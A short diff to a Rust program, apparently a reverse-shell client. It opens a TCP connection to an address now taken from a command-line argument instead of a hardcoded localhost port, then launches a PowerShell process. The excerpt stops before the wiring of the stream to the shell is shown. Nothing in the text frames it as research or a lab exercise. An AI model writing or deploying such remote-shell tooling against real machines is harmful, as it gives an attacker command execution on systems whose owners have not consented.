@@ -1,11 +1,11 @@
 use std::io::prelude::*;
 use std::net::{Shutdown, TcpStream};
 use std::process::{Command, Stdio};
+use std::env;
 
 fn main() {
-    println!("Hey");
-
-    let mut stream = TcpStream::connect("127.0.0.1:8080")
+    let args: Vec<String> = env::args().collect();
+    let mut stream = TcpStream::connect(&args[1])
         .expect("Server seems to be down");
 
     let process = Command::new("powershell")
